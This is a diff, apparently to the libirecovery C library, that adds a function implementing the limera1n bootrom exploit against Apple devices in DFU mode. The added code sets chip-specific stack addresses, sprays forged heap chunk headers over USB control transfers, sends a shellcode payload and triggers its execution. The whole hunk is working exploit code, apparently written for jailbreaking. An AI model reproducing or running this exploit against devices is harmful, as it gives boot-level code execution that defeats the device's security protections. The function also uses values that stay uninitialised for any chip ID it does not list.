@@ -1636,3 +1636,72 @@ irecv_client_t irecv_reconnect(irecv_client_t client, int initial_pause) {
 
 	return new_client;
 }
+
+irecv_error_t irecv_exploit_with_limera1n(irecv_client_t client, irecv_device_t device) {
+	irecv_error_t error = IRECV_E_SUCCESS;
+	unsigned int i = 0;
+	unsigned char buf[0x800];
+	unsigned char shellcode[0x800];
+	unsigned int max_size;
+	unsigned int stack_address;
+
+	switch (device->chip_id) {
+		case 0x8920:
+			max_size = 0x24000;
+			stack_address = 0x84033FA4;
+			break;
+
+		case 0x8922:
+			max_size = 0x24000;
+			stack_address = 0x84033F98;
+			break;
+
+		case 0x8930:
+			max_size = 0x2C000;
+			stack_address = 0x8403BF9C;
+			break;
+	}
+
+	memset(shellcode, 0x0, 0x800);
+	memcpy(shellcode, limera1n_payload, sizeof(limera1n_payload));
+
+	debug("Resetting device counters\n");
+	error = irecv_reset_counters(client);
+	if (error != IRECV_E_SUCCESS) {
+		debug("%s\n", irecv_strerror(error));
+		return error;
+	}
+
+	memset(buf, 0xCC, 0x800);
+	for(i = 0; i < 0x800; i += 0x40) {
+		unsigned int* heap = (unsigned int*)(buf+i);
+		heap[0] = 0x405;
+		heap[1] = 0x101;
+		heap[2] = 0x84000000 + max_size - 0x1000 + 1;
+		heap[3] = stack_address;
+	}
+
+	debug("Sending chunk headers\n");
+	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, USB_TIMEOUT);
+
+	memset(buf, 0xCC, 0x800);
+	for(i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
+		irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, USB_TIMEOUT);
+	}
+
+	debug("Sending exploit payload\n");
+	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, USB_TIMEOUT);
+
+	debug("Sending fake data\n");
+	memset(buf, 0xBB, 0x800);
+	irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, USB_TIMEOUT);
+	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, USB_TIMEOUT);
+
+	debug("Executing exploit\n");
+	irecv_usb_control_transfer(client, 0x21, 2, 0, 0, buf, 0, USB_TIMEOUT);
+
+	irecv_reset(client);
+	irecv_finish_transfer(client);
+
+	return error;
+}
